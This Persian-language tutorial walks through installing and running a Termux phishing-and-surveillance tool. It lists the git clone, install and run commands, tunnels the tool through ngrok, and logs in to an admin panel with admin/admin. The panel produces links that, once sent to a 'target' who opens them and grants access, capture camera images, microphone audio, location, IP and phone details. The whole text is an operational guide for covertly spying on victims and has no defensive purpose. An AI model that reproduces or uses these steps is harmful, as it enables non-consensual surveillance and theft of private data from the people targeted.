مقدمه

این یک ابزار کامل هست که فقط بیا همین ابزار میتونید دوربین و میکروفن و موقعیت مکانی و چند تا چیز دیگه رو + اطلاعاتی درباره گوشیش مثل تعداد هسته ها و مدل و ایپی و این چیزا رو به دست بیارید

ابزار

کد های ی زیر را به ترتیب و دونه دونه در ترموکس وارد کنید و اینتر را بزنید

pkg install git

pkg install python

pkg install python2

pkg install python3

با این دستور نصبش میکنیم

git clone https://github.com/mhmd138az/hack.git

با این دستور وارد پوشش میشیم

cd hack

باید این دستور فایل نصبی ابزار رو نصب میکنیم

bash install.sh

با این دستور ابزار های مورد نیاز رو نصب میکنیم

python3 -m pip install -r requirements.txt

و با این دستور ابزار رو اجرا میکنیم

python3 st.py

‌خب باید یه صفحه جدید باز کنیم برای این کار

انگشتتون رو بزارید سمت چپ صفحه گوشی توی ترموکس و بکشید به سمت راست یه صفحه باز میشه که دوتا گزینه داره و باید بزنید روی گزینه سمت راست و یه صفحه جدید باز میشه

. توجه داشته باشید باید قبل از این کار اموزش نصب و راه اندازی نگروک رو دیده باشید. حالا این دستور رو تو صفحه جدید وارد کنید

ngrok http 2525

خب لینکی که بهتون میده رو کپی کنید و تو مرورگر بزنید

اینجا از شما یوزر پسورد میخواد

admin : یوزرنیم

admin:پسورد

اینو که بزنید وارد صفحه ادمین میشید اینجا چند تا لینک بهتون داده که هرکدوم برای یه کاری هست

لینک اولی برای دوربین هست

لینک دومی برای میکروفن

لینک سوم و چهارم رو نمیدونم برای چیه تست نکردم خودتون تست کنید

لینک اخری هم برای موقعیت مکانی هست

هرکدوم رو خواستید کپی کنید بدید به تارگت وقتی بزنه رو لینک اطلاعات گوشیش میاد تو کادر وسط همین صفحه ادمین و وقتی دسترسی بده اطلاعاتش مثل عکس یا صدای میکروفن و اینا تو همین صفحه ادمین قسمت بالا سمت راست بهتون نمایش داده میشه و باید همون لحظه بزنید روش تا ببینید.
